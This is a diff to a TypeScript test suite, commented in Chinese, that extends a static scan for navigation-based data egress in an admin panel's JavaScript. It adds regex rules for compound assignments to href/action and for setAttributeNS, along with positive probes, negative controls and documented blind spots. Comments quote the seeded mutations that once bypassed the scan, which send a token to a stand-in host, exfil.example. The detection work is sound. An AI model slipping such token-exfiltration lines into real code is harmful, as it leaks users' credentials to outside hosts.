@@ -756,6 +756,13 @@ describe("面板的网络出口清单", () => {
 });
 
 /**
+ * 下面那张 `NAV_EGRESS_FORMS` 里四条「被赋值」规则共用的那一族赋值运算符。
+ * **写成一份，不抄四遍**（本仓登记过：没有单一真源的东西迟早会漂）。
+ * 为什么是这四个运算符、射程与反向控制在哪，见下面那段注释最后一条 ⚠️⚠️。
+ */
+const ASSIGN = String.raw`(?:\|\||&&|\?\?|\+)?=(?!=)`;
+
+/**
  * ── **导航一族的出口：P3d 全分支评审 F-3 补的那张表** ────────────────────────────
  *
  * ⚠️⚠️ **为什么它必须是独立的一张表、而不是往 `EGRESS_FORMS` 里再塞几条**：
@@ -803,14 +810,20 @@ describe("面板的网络出口清单", () => {
  * · **`href:` 属性字面量** —— 这是本仓**真正在用**的那种写法（`el("a", { href: url })`），
  *   今天恰好两处，都在下面那张表里。不收它的话这道扫描在真实代码上一个命中都没有，
  *   而**一张全零的清单与一道全瞎的扫描长得一模一样**。
- * · **`setAttribute("href"/"action", …)`** —— `el()` 内部走的是 `setAttribute(name, …)`
- *   （名字是变量，扫不到，也不该扫：它是那条通用路径），但**直接写字面量**是另一条路，
- *   补上它是零成本（今天零命中）。
+ * · **`setAttribute("href"/"action", …)` 与 `setAttributeNS(null, …)`** ——
+ *   `el()` 内部走的是 `setAttribute(name, …)`（名字是变量，扫不到，也不该扫：
+ *   它是那条通用路径），但**直接写字面量**是另一条路，补上它是零成本（今天零命中）。
+ *   ⚠️ `setAttributeNS(null, "href", u)` 在 HTML 元素上与 `setAttribute("href", u)`
+ *   **逐字等价**（null 命名空间就是 `setAttribute` 走的那一个），所以 `(?:NS)?` 与
+ *   那个可选的 `null,` 一起收进来。**命名空间不是 `null` 的那一种仍在盲点表里**
+ *   （只有 SVG 的 `xlink:href` 会那么写；`admin-ui/js` 下有 SVG——`js/ui.js` 的
+ *   `svgIcon()` 造 `<svg>` 与 `<path>`——但零处 SVG `<a>` / `<use>`、零处 `setAttributeNS`，
+ *   危害档位与那条盲点的实测都写在盲点表那一条里）。
  * · **`.action` 被赋值** —— `form.action = u`。`js/sec-playground.js` 真实的
  *   `step.action === "giveUp"` 与 `js/pure/playground.mjs` 的 `{ action: "giveUp" }`
  *   都不匹配（前者被 `(?!=)` 挡住，后者是 `action:` 不是 `.action =`）。
  *   ⚠️ **表单那一族今天另有 CSP `form-action 'none'` 兜着**，收它是第二层，不是唯一一层。
- * · **方括号 + 字面量属性名被赋值**（`/\[\s*["'](?:href|action)\s*["']\s*\]\s*=(?!=)/`）
+ * · **方括号 + 字面量属性名被赋值**（`/\[\s*["'](?:href|action)["']\s*\]\s*ASSIGN/`）
  *   —— `el["href"] = u` / `location['href'] = u` / `node["action"] = u`。
  *   ⚠️⚠️ **这一条是修复定向复评补进来的，补之前这一整族完整逃逸**：把
  *   `location["href"] = "https://exfil.example/collect?k=" + token` 插进
@@ -820,21 +833,47 @@ describe("面板的网络出口清单", () => {
  *   ⚠️ **它当时也不在下面那张盲点表里**：盲点第 1 条写着「真正逃得掉的只有属性名本身
  *   也被拼出来的那一种 —— 属于刻意绕开」，而 `["href"]` 的属性名是**普通字面量**、
  *   零拼接、零绕开意图。**那句全称句是假的，已连同这一条一起改真。**
- *   ⚠️ **点名两个属性名，不写成「任意属性名」**：`o["timeout"] = 5` 这类无关赋值
- *   一个都不许被误红（反向控制那一组逐条钉着），而一道会误红的护栏过不了三轮就会被放宽。
- *   `(?!=)` 照旧挡住 `o["href"] === x` 这种读取比较；`{ ["href"]: u }` 那种计算属性名
- *   后面跟的是 `:` 不是 `=`，仍在盲点表里。
+ *   ⚠️ **点名两个属性名，不写成「任意属性名」**：`cfg["timeout"] = 5` 这类**换个属性名**
+ *   的赋值一个都不许被误红（反向控制那一组逐条钉着），而一道会误红的护栏过不了三轮
+ *   就会被放宽。⚠️ **但「不误红」的射程只到属性名这一层，不到接收者那一层，明写**：
+ *   `params["href"] = "/local"` 这种**属性名就叫 href、接收者却是普通对象**的写法
+ *   **会被数成 1**（实测），这是判据「落在属性名被写上、不落在接收者叫什么」的
+ *   直接代价 —— 换成落在接收者上，一个变量名就绕过去了。这一族已连同期望值
+ *   一起登记在 `NAV_OVER_REACH` 里，**边界是断言，不是散文**。
+ *   `{ ["href"]: u }` 那种计算属性名后面跟的是 `:` 不是 `=`，仍在盲点表里。
+ * · **⚠️⚠️ 上面四条「被赋值」的规则收的是一族赋值运算符，不只是那一个 `=`**
+ *   （`ASSIGN` = `/(?:\|\||&&|\?\?|\+)?=(?!=)/`）。
+ *   **这是第二轮修复定向复评 G1 补进来的，补之前这一族完整逃逸，而且当时被一句
+ *   假话降级封存着**：上一版把 `+=` 登记成盲点并写着「`+=` 只能拼在当前那条 URL
+ *   后面，而当前那条 URL 恒是面板自己（同源）⇒ 它送不到外站去」。
+ *   **那是一句关于接收者的全称句，而它是假的**：这几条规则本来就同时盖住
+ *   `a.href` / `el["href"] / form.action`，而**新建出来的 `<a>` 的 `href` 初值是空串**
+ *   ⇒ `+=` 拼在空串上得到的就是**一整条外站 URL**。
+ *   **【实测，复评当场种的那一次】** 往 `js/sec-playground.js` 插一行
+ *   `const probeB = document.createElement("a");`
+ *   `probeB.href += "https://exfil.example/collect?k=" + token; probeB.click();`
+ *   走完「改文件 → `build-ui` → 跑全量」⇒ **`pnpm test` 2735 全绿，十二道门禁一道不吵**。
+ *   `||=` / `??=` / `&&=` 三个同族运算符同理（同一次实测，同样全绿）。
+ *   ⇒ **危害与直接赋值同级**，这一族因此**收进判据**，不再留在盲点表里。
+ *   ⚠️ **只收这四个运算符是有判据的，不是挑顺手的**：能把一整条 URL 留在那一格里的
+ *   只有它们（`+=` 拼串、`||=` / `??=` / `&&=` 直接把一整条串写进去）；
+ *   `-=` / `*=` / `&=` 这些**一律把两边强转成数字**，写进去的是 `NaN` 或一个数
+ *   （实测：`let s = ""; s -= "https://exfil.example";` ⇒ `NaN`），送不出任何东西。
+ *   ⚠️ **放宽 `=` 前面那一格正是最容易写反的地方**（本仓那张取数表上记着写反两次的
+ *   后果）⇒ 反向控制里 `>=` / `<=` / `!==` / `===` / `==` / `!=` **逐条钉着必须是 0**，
+ *   `a.href + "?x=1"` 这种「读完再拼串」也钉着必须是 0。
  */
+
 const NAV_EGRESS_FORMS: ReadonlyArray<{ label: string; re: RegExp }> = [
-  { label: "href 被赋值（含 location.href / a.href / 别名）", re: /\.\s*href\s*=(?!=)/g },
-  { label: "location 整体被赋值", re: /\blocation\s*=(?!=)/g },
+  { label: "href 被赋值（含 location.href / a.href / 别名；含 += ||= ??= &&=）", re: new RegExp(String.raw`\.\s*href\s*${ASSIGN}`, "g") },
+  { label: "location 整体被赋值", re: new RegExp(String.raw`\blocation\s*${ASSIGN}`, "g") },
   { label: "location.assign(", re: /\blocation\s*\.\s*assign\s*\(/g },
   { label: "location.replace(", re: /\blocation\s*\.\s*replace\s*\(/g },
   { label: "open(（含 window.open）", re: /(?<![A-Za-z0-9_$-])open\s*\(/g },
   { label: "href: 属性字面量", re: /(?<![A-Za-z0-9_$-])href\s*:/g },
-  { label: 'setAttribute("href"/"action")', re: /setAttribute\(\s*["'](?:href|action)["']/g },
-  { label: "form 的 action 被赋值", re: /\.\s*action\s*=(?!=)/g },
-  { label: '方括号 + 字面量属性名被赋值（el["href"] = / location["href"] =）', re: /\[\s*["'](?:href|action)["']\s*\]\s*=(?!=)/g },
+  { label: 'setAttribute("href"/"action")（含 setAttributeNS(null, …)）', re: /setAttribute(?:NS)?\(\s*(?:null\s*,\s*)?["'](?:href|action)["']/g },
+  { label: "form 的 action 被赋值", re: new RegExp(String.raw`\.\s*action\s*${ASSIGN}`, "g") },
+  { label: '方括号 + 字面量属性名被赋值（el["href"] = / location["href"] =）', re: new RegExp(String.raw`\[\s*["'](?:href|action)["']\s*\]\s*${ASSIGN}`, "g") },
 ];
 
 /** 一段源码里的**导航出口**处数。**注释与模板串字面文本都不算**（与取数那道共用 `codeOnly()`）。 */
@@ -879,14 +918,42 @@ const NAV_BLIND_SPOTS: ReadonlyArray<{ probe: string; why: string }> = [
       + "改坏一次两道一起变瞎。**今天登记，不今天补**（与下面那条取值用法同一条裁定）。",
   },
   {
-    probe: 'location.href += "?k=" + t;',
-    why: "**复合赋值（`+=`）扫不到**：上面几条都要求 `=` 前面不是别的运算符"
-      + "（`(?!=)` 只挡 `==`，而 `+=` 是 `+` 在前，`\\s*=` 根本走不到）。"
-      + "⚠️ **危害档位明写，别把它读成与直接赋值同级**：`+=` 只能把东西**拼在当前那条"
-      + "URL 后面**，而当前那条 URL 恒是面板自己（同源）⇒ 它送不到外站去，"
-      + "只会把口令写进自己的地址栏与 referrer。"
-      + "⚠️ 收它的代价是把 `=(?!=)` 放宽成一族运算符，而那正是最容易写反的地方"
-      + "（本仓那张取数表上记着写反两次的后果）。**今天登记，不今天补。**",
+    probe: 'location.search = "?k=" + t; location.hash = "#" + t;',
+    why: "**`location` 上除 `href` 之外的那几格（`search` / `hash` / `pathname`）扫不到**："
+      + "上面那条规则只认 `href` 这一个属性名。"
+      + "⚠️ **危害档位是实测出来的，不是估的**：这几格按 URL 规范只替换**当前那条 URL**的"
+      + "查询串 / 片段 / 路径，**换不掉 host**（实测："
+      + "`const u = new URL(\"https://panel.invalid/x\"); u.search = \"https://exfil.example/?k=T\";`"
+      + " ⇒ `u.href` 仍是 `https://panel.invalid/x?https://exfil.example/?k=T`）"
+      + "⇒ 它**送不到外站去**，代价是把口令写进自己的地址栏、历史记录与 referrer。"
+      + "⚠️⚠️ **这条「送不到外站」与上一版给 `+=` 写的那句长得一样，但两者不是一回事**："
+      + "`+=` 那条被证伪，是因为**接收者可以是任意元素**（新建 `<a>` 的 `href` 初值是空串）；"
+      + "而 `search` / `hash` 的 setter 在任何接收者上都只改现有 URL 的那一段"
+      + "——**差别在「接收者能不能换」，不在运算符**。"
+      + "⚠️ 收它的代价是把属性名那一族从 2 个扩到 5 个，而多出来的三个今天零命中、"
+      + "危害又只到同源档。**今天登记，不今天补。**",
+  },
+  {
+    probe: 'a.setAttributeNS("http://www.w3.org/1999/xlink", "href", u);',
+    why: "**命名空间不是 `null` 的 `setAttributeNS` 扫不到**：上面那条只放行可选的 `null,`。"
+      + "⚠️ **危害档位与直接赋值同级**（SVG `<a xlink:href>` 一样能跳外站），"
+      + "**接受它的理由是「今天没有能挂它的元素」而不是「不严重」**。"
+      + "⚠️⚠️ **这一句的第一版写的是「零处 SVG」，一 grep 就是假的，如实记下来**："
+      + "`js/ui.js` 的 `svgIcon()` **确实**在造 SVG（`createElementNS(SVG_NS, …)` 两处）。"
+      + "**实测出来的真话是三条**：那两处造的只有 `<svg>` 与 `<path>`；"
+      + "`admin-ui/js` 下**零处** SVG `<a>` / `<use>` / `<image>`（带可导航 `xlink:href` 的只有它们）；"
+      + "`admin-ui/js` 下**零处 `setAttributeNS`**（`svgIcon()` 里全是 `setAttribute(字面量, …)`）。"
+      + "⚠️ 这是「今天没有能挂它的元素」，不是「结构上不可能」——"
+      + "哪天有人造一个 SVG `<a>` 或 `<use>`，这条盲点当场变活。"
+      + "⚠️⚠️ **「这道扫描抓不住它」是单独核过的，别被一次红骗了**："
+      + "把 `createElementNS(SVG_NS, \"a\") + setAttributeNS(xlink, \"href\", …+token)` "
+      + "种进 `js/sec-playground.js` 走全量 ⇒ 确实红了 10 格，"
+      + "**但红的原因是 `tests/helpers/fake-dom.ts` 没有 `setAttributeNS` 这个方法"
+      + "（`TypeError: probeSvg.setAttributeNS is not a function`），不是这道扫描**；"
+      + "本文件单跑 **124 全绿**。账本 `:465` 记的就是这个形状："
+      + "**门禁红了不等于门禁抓住了你以为的那件事。**"
+      + "收它的代价是把第一个实参放宽成「任意东西」，而那会让 "
+      + "`setAttribute(\"data-x\", \"href\")` 这种写法误红。",
   },
   {
     probe: "const go = location.assign; go(u);",
@@ -1001,6 +1068,18 @@ describe("面板的导航出口清单（CSP 拦不住的那一族）", () => {
     ['location["href"] = u;', 1, "复评那条变异逐字就是它（拼上 token 再跳外站）"],
     ['node["action"] = u;', 1, "表单那一条同理"],
     ['el[ "href" ] = u;', 1, "方括号内外的空白不许把它漏过去"],
+    ['node.setAttributeNS(null, "href", u);', 1, "null 命名空间的 setAttributeNS 与 setAttribute 逐字等价"],
+    // ── 一族赋值运算符（第二轮复评 G1：补之前整族逃逸，而且被一句「送不到外站去」降级封存）──
+    //    ⚠️ 复评实测：`document.createElement("a").href += "https://exfil…?k=" + token; a.click();`
+    //    走完十二道门禁 2735 全绿 —— 新建 <a> 的 href 初值是空串，`+=` 拼出来就是一整条外站 URL。
+    ['a.href += "?k=" + t;', 1, "复合赋值：接收者是新建的 <a> 时，拼在空串上就是一整条外站 URL"],
+    ['location.href += "?k=" + t;', 1, "同一族，接收者是 location（这一种确实只到同源档，但判据不按接收者分档）"],
+    ["el.href ||= u;", 1, "逻辑赋值：??= / ||= / &&= 都能把一整条串写进去"],
+    ["el.href ??= u;", 1, "同上"],
+    ["el.href &&= u;", 1, "同上"],
+    ['el["href"] += "?k=" + t;', 1, "方括号那一族同样收一族运算符"],
+    ["form.action ||= u;", 1, "表单那一条同理"],
+    ["location ??= u;", 1, "location 整体那一条同理"],
   ])("正向自检：这一种写法真的被数出来：%s", (probe, expected) => {
     expect(navEgressSites(probe as string)).toBe(expected as number);
   });
@@ -1039,8 +1118,53 @@ describe("面板的导航出口清单（CSP 拦不住的那一族）", () => {
     ['cfg["timeout"] = 5;', 0, "别的属性名：方括号赋值本身不是出口，只有 href/action 才是"],
     ['el["className"] = c;', 0, "同上，一个字面量属性名赋值的普通写法"],
     ['if (m["action"] !== "go") return;', 0, "!== 同样不是赋值"],
+    // ── 一族赋值运算符的反向控制（第二轮复评 G1）───────────────────────────────
+    // ⚠️⚠️ **放宽 `=` 前面那一格正是最容易写反的地方**：写成 `/[|&?+<>!=]*=/` 这类
+    //    「随便几个符号 + =」，下面这一整批**比较运算符**会集体误红，而这道扫描的
+    //    期望值是一张两条的清单 ⇒ 它会红成「多了一堆出口」，**病因会被读错**。
+    //    下面这批**逐条取自复评 §3.1 那张 37 条探针表**（那一轮实测零认错）。
+    ["if (a.href >= b) return;", 0, ">= 不是赋值 —— 放宽运算符族最容易在这里写反"],
+    ["if (a.href <= b) return;", 0, "<= 同上"],
+    ["if (a.href != b) return;", 0, "!= 同上"],
+    ["if (a.href == b) return;", 0, "== 同上（旧规则的 (?!=) 本来就挡它，放宽之后仍要挡）"],
+    ['if (o["href"] >= x) return;', 0, "方括号那一族同样不许被 >= 打中"],
+    ['if (o["action"] !== y) return;', 0, "方括号那一族同样不许被 !== 打中"],
+    ["if (o.action >= 3) return;", 0, "action 那一条同理"],
+    ['const s = target.href + "?x=1";', 0, "**读完再拼串**：`.href + \"…\"` 不是 `.href += \"…\"`，一个空格之差"],
+    ["const s = a.href + b.href;", 0, "同上，两边都是读"],
+    ["if (x >= location.origin.length) return;", 0, "location 后面跟的是 `.`，比较落在别处"],
+    ['node.setAttribute("data-i18n", key);', 0, "js/ui.js 真实写法：别的属性名"],
   ])("反向控制：这一种合法写法不许被数成出口：%s", (probe, expected) => {
     expect(navEgressSites(probe as string)).toBe(expected as number);
+  });
+
+  /**
+   * ── **已知会「多数一处」的写法，连同期望值一起登记（第二轮复评 G8）** ──────────
+   *
+   * ⚠️⚠️ **上面那张表的判据落在「`href` / `action` 这一格被写」上，不落在「接收者是谁」上**
+   *（理由在 `NAV_EGRESS_FORMS` 上面那段：落在接收者上的话，一个变量名就绕过去了）。
+   * **代价是对称的**：属性名就叫 `href` / `action`、但接收者其实是个普通对象的写法
+   * **会被数成一处出口**。
+   *
+   * ⚠️ **上一版把这件事写成了「`o[\"timeout\"] = 5` 这类无关赋值一个都不许被误红」，
+   * 而反向控制那五格挑的全是「换个属性名」或「读」——没有一格是「属性名对、接收者不对」。**
+   * 复评实测 `params[\"href\"] = \"/local\"` / `handlers[\"action\"] = cb` **各误红 1**。
+   * ⇒ 那句话的射程只到属性名这一层，**这一组就是它另一半边界的常驻化**。
+   *
+   * **今天为什么可以接受**：`admin-ui/js` 下**零处**这种写法（那道计数门禁的期望值
+   * 就是两条真实出口，多一条当场红）。哪天真有人写了，红的时候读到的是这一组，
+   * 而不是「护栏坏了」——**处置是把那一处改名或加白，不是把判据放宽到接收者上**。
+   */
+  it.each([
+    ['params["href"] = "/local";', 1, "属性名对、接收者是个普通参数对象 —— 判据看不出这件事"],
+    ["handlers[\"action\"] = cb;", 1, "同上，一个与导航无关的回调表"],
+    ["opts.href = localPath;", 1, "点号那一族同理：接收者是普通选项对象"],
+  ])("已知会多数一处（判据按属性名、不按接收者）：%s", (probe, expected) => {
+    expect(
+      navEgressSites(probe as string),
+      "这条写法的命中数变了。**它是一条已登记的过度覆盖，不是护栏坏了** —— "
+      + "改判据之前先读上面那段：判据落在接收者上的话，一个变量名就绕过去了",
+    ).toBe(expected as number);
   });
 
   /**
